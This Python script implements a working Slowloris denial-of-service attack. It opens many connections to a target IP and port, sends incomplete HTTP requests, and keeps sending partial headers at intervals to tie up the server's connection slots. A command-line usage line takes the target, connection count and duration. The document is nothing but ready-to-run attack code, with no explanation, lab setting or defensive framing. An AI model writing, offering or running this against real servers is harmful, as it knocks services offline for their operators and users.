import socket
import sys
import time

MIN_ARGUMENTS = 5
PARTIAL_HEADER_INTERVAL = 10
CONNECT_TIMEOUT = 4
SOCKET_KEEPALIVE_HEADER = "X-a: b\r\n"

def open_connection(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(CONNECT_TIMEOUT)
        sock.connect((target_ip, target_port))
        sock.send(b"GET / HTTP/1.1\r\n")
        sock.send(b"Host: target\r\n")
        return sock
    except OSError:
        return None

def run_slowloris(target_ip, target_port, connection_count, duration_seconds):
    sockets = []
    index = 0
    while index < connection_count:
        sock = open_connection(target_ip, target_port)
        if sock is not None:
            sockets.append(sock)
        index = index + 1
    print(f"Opened {len(sockets)} connections")
    end_time = time.time() + duration_seconds
    while time.time() < end_time:
        alive = []
        socket_index = 0
        while socket_index < len(sockets):
            sock = sockets[socket_index]
            try:
                sock.send(SOCKET_KEEPALIVE_HEADER.encode())
                alive.append(sock)
            except OSError:
                pass
            socket_index = socket_index + 1
        sockets = alive
        print(f"Keeping {len(sockets)} connections alive...")
        time.sleep(PARTIAL_HEADER_INTERVAL)
    socket_index = 0
    while socket_index < len(sockets):
        sockets[socket_index].close()
        socket_index = socket_index + 1
    print("Slowloris finished")

def main():
    if len(sys.argv) < MIN_ARGUMENTS:
        print("Usage: venv/bin/python slowloris.py TARGET_IP TARGET_PORT CONNECTIONS SECONDS")
        return
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    connection_count = int(sys.argv[3])
    duration_seconds = int(sys.argv[4])
    run_slowloris(target_ip, target_port, connection_count, duration_seconds)

if __name__ == "__main__":
    main()